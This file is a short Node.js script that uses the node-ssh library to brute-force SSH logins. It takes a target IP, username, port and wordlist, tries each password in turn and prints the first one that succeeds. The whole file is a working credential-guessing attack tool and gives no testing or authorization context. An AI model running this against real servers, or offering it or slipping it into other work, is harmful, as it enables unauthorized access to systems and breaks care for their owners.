//Dependencies
const { NodeSSH } = require("node-ssh")
const Fs = require("fs")

//variables
const Self_Args = process.argv.slice(2)

const SSH = new NodeSSH()

//Main
if(!Self_Args.length){
    console.log("node index.js <ip> <username> <port> <dictionary>")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid username.")
    process.exit()
}

if(!Self_Args[2]){
    console.log("Invalid port.")
    process.exit()
}

if(!Self_Args[3]){
    console.log("Invalid dictionary.")
    process.exit()
}

if(isNaN(Self_Args[2])){
    console.log("Make sure port is Int.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[3])){
    console.log("Invalid dictionary.")
    process.exit()
}

var file_data = Fs.readFileSync(Self_Args[3], "utf8").replace(/\r/g, "").split("\n")

if(!file_data.length){
    console.log("Dictionary data is empty.")
    process.exit()
}

var password_index = 0

console.log("Checking has started.")
Check()
function Check(){
    if(password_index == file_data.length){
        console.log("Finished checking, no valid password found.")
        process.exit()
    }

    SSH.connect({
        "host": Self_Args[0],
        "username": Self_Args[1],
        "password": file_data[password_index],
        "port": Self_Args[2]
    }).then(()=>{
        console.log(`Valid password ${file_data[password_index]}`)
        process.exit()
    }).catch(()=>{
        console.log(`Invalid password ${file_data[password_index]}`)

        password_index++
        Check()
    })
}
